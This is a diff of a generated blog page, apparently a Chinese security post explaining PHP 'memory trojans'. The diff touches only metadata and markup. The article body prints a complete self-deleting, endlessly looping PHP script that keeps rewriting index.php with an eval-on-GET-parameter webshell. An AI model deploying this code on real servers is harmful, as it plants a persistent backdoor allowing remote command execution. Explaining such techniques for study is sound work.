@@ -6,17 +6,17 @@
   
   <title>program-PHP-Memory-Trojan | thedarknessdied</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="PHP内存马0. 内存马概念​	内存马是无文件攻击的一种常用手段，利用中间件的进程执行某些恶意代码。所谓的不死马，其实就是直接用代码弄一个死循环，强占一个 PHP 进程，并不间断的写一个PHP shell，或者执行一段代码 1. 内存马剖析12345678910&lt;?php	set_time_limit(0);	ignore_user_abort(1);	unlink(__FILE__);	w">
+  <meta name="description" content="PHP内存马0. 内存马概念​	内存马是无文件攻击的一种常用手段，利用中间件的进程执行某些恶意代码。所谓的不死马，其实就是直接用代码弄一个死循环，强占一个 PHP 进程，并不间断的写一个PHP shell，或者执行一段代码">
 <meta property="og:type" content="article">
 <meta property="og:title" content="program-PHP-Memory-Trojan">
 <meta property="og:url" content="http://example.com/2024/03/21/program-PHP-Memory-Trojan/index.html">
 <meta property="og:site_name" content="thedarknessdied">
-<meta property="og:description" content="PHP内存马0. 内存马概念​	内存马是无文件攻击的一种常用手段，利用中间件的进程执行某些恶意代码。所谓的不死马，其实就是直接用代码弄一个死循环，强占一个 PHP 进程，并不间断的写一个PHP shell，或者执行一段代码 1. 内存马剖析12345678910&lt;?php	set_time_limit(0);	ignore_user_abort(1);	unlink(__FILE__);	w">
+<meta property="og:description" content="PHP内存马0. 内存马概念​	内存马是无文件攻击的一种常用手段，利用中间件的进程执行某些恶意代码。所谓的不死马，其实就是直接用代码弄一个死循环，强占一个 PHP 进程，并不间断的写一个PHP shell，或者执行一段代码">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/image-20240321150609522.png">
 <meta property="og:image" content="http://example.com/images/image-20240321170010699.png">
 <meta property="article:published_time" content="2024-03-21T09:21:03.000Z">
-<meta property="article:modified_time" content="2024-03-21T09:22:13.459Z">
+<meta property="article:modified_time" content="2024-03-26T02:19:54.851Z">
 <meta property="article:author" content="R0seK1llere">
 <meta property="article:tag" content="php">
 <meta property="article:tag" content="web">
@@ -103,6 +103,7 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <h1 id="PHP内存马"><a href="#PHP内存马" class="headerlink" title="PHP内存马"></a>PHP内存马</h1><h2 id="0-内存马概念"><a href="#0-内存马概念" class="headerlink" title="0. 内存马概念"></a>0. 内存马概念</h2><p>​	内存马是无文件攻击的一种常用手段，利用中间件的进程执行某些恶意代码。所谓的不死马，其实就是直接用代码弄一个死循环，强占一个 PHP 进程，并不间断的写一个PHP shell，或者执行一段代码</p>
+<span id="more"></span>
 <h2 id="1-内存马剖析"><a href="#1-内存马剖析" class="headerlink" title="1. 内存马剖析"></a>1. 内存马剖析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;index.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">		<span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);</span><br><span class="line">	&#125;	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 
@@ -172,7 +173,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/program-PHP-Memory-Trojan/" data-id="clu7r07gd0001gvvd2m1gdbrr" data-title="program-PHP-Memory-Trojan" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/program-PHP-Memory-Trojan/" data-id="clu7re9j800014bvd38004yby" data-title="program-PHP-Memory-Trojan" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
